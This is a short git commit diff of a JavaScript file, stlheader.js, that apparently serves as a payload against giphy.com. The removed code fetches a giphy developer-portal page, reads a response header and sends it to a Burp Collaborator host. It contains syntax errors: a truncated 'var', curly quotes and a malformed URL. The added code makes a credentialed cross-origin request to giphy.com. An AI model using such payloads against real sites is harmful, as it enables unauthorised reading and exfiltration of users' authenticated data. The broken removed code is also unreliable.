456c28359c3df82f1f60170a0860105b246b3fe7
naysser <77415898+naysser@users.noreply.github.com>
2021-08-18 21:06:47 +0200

    Update stlheader.js

--- stlheader.js
+++ stlheader.js
@@ -1,13 +1,4 @@
-ar xhr = new XMLHttpRequest();
-xhr.onreadystatechange = function()
-{
-if (xhr.readyState == 4 && xhr.status == 200)
-{
-var yourtoken = xhr.getResponseHeader(‘Server’)
-var xhr2 = new XMLHttpRequest();
-xhr2.open(“GET”, “http:/vvu2yz9vsm5131mmm92vbmi4vv1mpb.burpcollaborator.net/"+ yourtoken );
-xhr2.send();
-}
-}
-xhr.open(“GET”, “https://devportal-new.giphy.com/dashboard/");
-xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://giphy.com/', true);
+xhr.withCredentials = true;
+xhr.send(null);
